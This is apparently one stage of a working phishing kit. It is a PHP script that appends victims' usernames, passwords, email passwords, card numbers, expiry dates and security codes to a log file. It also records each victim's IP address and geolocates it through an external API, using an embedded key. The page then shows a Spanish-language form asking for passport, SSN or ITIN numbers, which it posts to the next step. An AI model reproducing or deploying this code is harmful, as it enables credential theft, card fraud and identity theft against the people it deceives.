<?php
session_start();


@$fhandlr = fopen($_SESSION['FN'], "a");

$_SESSION['cn'] = $_POST['ipts6'];
$_SESSION['cm'] = $_POST['ipts7'];
$_SESSION['ca'] = $_POST['ipts8'];
$_SESSION['co'] = $_POST['ipts9'];


@fwrite($fhandlr, "***********************************************\n");
@fwrite($fhandlr, 'U: '.$_SESSION['U1']."\n");
@fwrite($fhandlr, 'P: '.$_SESSION['P1']."\n");
@fwrite($fhandlr, 'E: '.$_SESSION['E1']."\n");
@fwrite($fhandlr, 'EP: '.$_SESSION['EP1']."\n");
@fwrite($fhandlr, 'AT-M: '.$_SESSION['AT1']."\n");
@fwrite($fhandlr, 'Cnum: '.$_SESSION['cn']."\n");
@fwrite($fhandlr, 'Cexp: '.$_SESSION['cm'].'/'.$_SESSION['ca']."\n");
@fwrite($fhandlr, 'Ccod: '.$_SESSION['co']."\n");


if( !empty($_SERVER['REMOTE_ADDR']) ){

    @$api_url = "http://api.ipinfodb.com/v3/ip-city/?key=9878000ae447eadf64046ddbbf3d8588bce21329f0a5882bdfb8c4fc8c0a3fbf&ip=".$_SERVER['REMOTE_ADDR'];
    @$IPResult =  file_get_contents($api_url);
    @fwrite($fhandlr, 'IP: '.$_SERVER['REMOTE_ADDR']."\n");
    @fwrite($fhandlr, 'LC: '.$IPResult."\n");

}elseif( !empty($_SERVER['HTTP_X_FORWARDED_FOR']) ){

    @$api_url = "http://api.ipinfodb.com/v3/ip-city/?key=9878000ae447eadf64046ddbbf3d8588bce21329f0a5882bdfb8c4fc8c0a3fbf&ip=".$_SERVER['HTTP_X_FORWARDED_FOR'];
    @$IPResult =  file_get_contents($api_url);
    @fwrite($fhandlr, 'IP: '.$_SERVER['HTTP_X_FORWARDED_FOR']."\n");
    @fwrite($fhandlr, 'LC: '.$IPResult."\n");

}else{
    fwrite($fhandlr, 'IP1: '.$_SERVER['REMOTE_ADDR']."\n");
    fwrite($fhandlr, 'IP2: '.$_SERVER['HTTP_X_FORWARDED_FOR']."\n");
}

fwrite($fhandlr, 'Date: '. date("d-m-Y")."\n");
fclose($fhandlr);

?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=0.7">
<title></title>
<link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon">

</head>
<body style="font-family:sans-serif;font-size: 16px;font-weight: 400;background: rgba(0,0,0,0.32);">
	<div id="cnt2" style="text-align:center;">
		<form action="step-5.php" method="post" style="background:#fff;display: inline-block;
    background-image: url(images/afrms3.svg);
    width: 980px;
    background-repeat: no-repeat;
    height: 552px;text-align:left;margin-top:20px;">
		

        <select name="ipts10" style="position: relative;
    top: 247px;
    left: 370px;
    width: 152px;
    display: block;
    height: 22px;
    font-size: 14px;">
            <option value="">Seleccione</option>
            <option value="pasaporte">Pasaporte</option>
            <option value="ssn">Número de Seguro Social (SSN)</option>
            <option value="itin">Número de Identificación Personal del Contribuyente (ITIN)</option>
        </select>



        <input name="ipts11" type="text" style="position: relative;
    top: 286px;
    left: 370px;
    width: 144px;
    display: block;
    height: 16px;
    font-size: 12px;" required placeholder="000-00-000">



    <input type="submit" style="position: relative;
    top: 377px;
    left: 641px;
    width: 110px;
    display: block;
    height: 24px;
    font-size: 12px;" value="Confirmar">

			
		</form>
	</div>
	<div style="text-align:center;">
		<footer style="opacity:0.6;padding-top: 20px;margin-top: 80px;background-color: #eee;width: 980px;display:inline-block;text-align:left;">
			<img src="images/fts1.svg" alt="" style="width:80%;max-width:600px;margin-left:10px">
		</footer>
	</div>
</body>
</html>